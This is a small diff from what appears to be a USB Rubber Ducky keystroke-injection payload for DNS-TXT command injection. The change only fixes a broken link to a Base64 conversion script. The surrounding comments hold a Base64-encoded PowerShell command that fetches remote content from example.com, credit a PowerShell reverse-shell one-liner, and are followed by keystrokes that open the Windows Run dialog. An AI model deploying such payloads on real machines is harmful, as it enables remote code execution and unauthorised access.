@@ -28,7 +28,7 @@ REM     Encoded: "aQByAG0AIABoAHQAdABwADoALwAvAGUAeABhAG0AcABsAGUALgBjAG8AbQAvAF
 REM     ShoutOut: powershell reverse shell one-liner by Nikhil SamratAshok Mittal @samratashok. See link below.
 REM     https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3
 REM     The link below has the Powershell script to convert your payloads to Base64.
-REM     https://https://github.com/nathansb2022/usbrubberducky-payloads/blob/master/payloads/library/execution/DNS-TXT-CommandInection/convertBase64.ps1	
+REM     https://github.com/nathansb2022/usbrubberducky-payloads/blob/master/payloads/library/execution/DNS-TXT-CommandInjection/ConvertBase64.ps1
 
 DELAY 1000 
 GUI r
